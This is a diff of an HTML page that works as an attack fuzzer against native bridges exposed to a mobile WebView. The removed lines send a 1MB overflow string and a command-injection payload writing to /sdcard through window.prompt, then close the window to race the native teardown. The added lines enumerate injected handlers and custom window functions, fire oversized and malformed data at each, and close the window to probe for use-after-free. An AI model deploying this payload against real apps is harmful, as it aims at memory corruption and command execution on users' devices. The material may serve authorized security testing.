@@ -1,35 +1,66 @@
 <!DOCTYPE html>
 <html>
-<head><title>JNI Bridge Fuzzer</title></head>
-<body style="background:#000; color:#0f0;">
-    <h3>Fuzzing JNI Bridge via window.prompt...</h3>
+<head><title>JSI Shotgun Fuzzer</title></head>
+<body style="background:#111; color:#0f0;">
+    <h2>Fuzzing all injected interfaces...</h2>
+    <div id="log"></div>
+
     <script>
-        function fuzz() {
-            // 1. Buffer Overflow Attempt: Send a massive 1MB string
-            // If C++ uses a 4KB stack buffer, this will crash libhelium.so
-            let bigStr = "A".repeat(1024 * 1024);
-            
-            // 2. Command Injection Attempt: Send common command delimiters
-            let cmdStr = '{"command":"test", "args":"; /system/bin/id > /sdcard/pwned"}';
+        const logEl = document.getElementById('log');
+        function log(msg) { logEl.innerHTML += msg + "<br>"; }
 
-            // 3. Trigger the fuzzer loop
-            setInterval(() => {
+        // The malformed data we want to force into a C++ buffer
+        const giantString = "A".repeat(1024 * 1024); // 1MB string
+        const malformedJson = '{"cmd":"test", "data":' + giantString + '}';
+
+        function shotgun() {
+            log("[*] Commencing Shotgun Fuzz...");
+
+            // 1. Attack common WebKit Message Handlers (iOS style, but sometimes present on Android)
+            try {
+                if (window.webkit && window.webkit.messageHandlers) {
+                    for (let handler in window.webkit.messageHandlers) {
+                        log("Firing at webkit handler: " + handler);
+                        window.webkit.messageHandlers[handler].postMessage(giantString);
+                        window.webkit.messageHandlers[handler].postMessage(malformedJson);
+                    }
+                }
+            } catch(e) {}
+
+            // 2. Attack ALL functions on the window object that aren't native browser functions
+            for (let prop in window) {
                 try {
-                    // We send the massive string through the bridge
-                    // The high latency you saw means C++ is busy parsing this
-                    window.prompt(bigStr); 
-                    window.prompt(cmdStr);
+                    let obj = window[prop];
+                    if (typeof obj === 'function' && !obj.toString().includes('[native code]')) {
+                        // Found a custom injected function! Fire at will.
+                        log("Firing at global function: " + prop);
+                        obj(giantString);
+                        obj(malformedJson);
+                    } else if (typeof obj === 'object' && obj !== null && prop !== 'window' && prop !== 'document') {
+                         // Look inside objects (like window._FB_.doSomething)
+                         let methods = Object.getOwnPropertyNames(Object.getPrototypeOf(obj));
+                         methods.forEach(m => {
+                             if (typeof obj[m] === 'function') {
+                                 log(`Firing at object method: ${prop}.${m}`);
+                                 obj[m](giantString);
+                                 obj[m](malformedJson);
+                             }
+                         });
+                    }
                 } catch(e) {}
-            }, 100);
-
-            // 4. Trigger the teardown race condition
-            // Close the window while C++ is still busy parsing the 1MB string
-            setTimeout(() => {
-                window.close();
-            }, 1500);
+            }
+            
+            log("[*] Volley complete.");
         }
 
-        setTimeout(fuzz, 1000);
+        // Run the fuzzer immediately
+        shotgun();
+
+        // Optional: Trigger destruction to test for UAF if the buffer overflow fails
+        setTimeout(() => {
+            window.close(); 
+        }, 1000);
+
     </script>
 </body>
 </html>
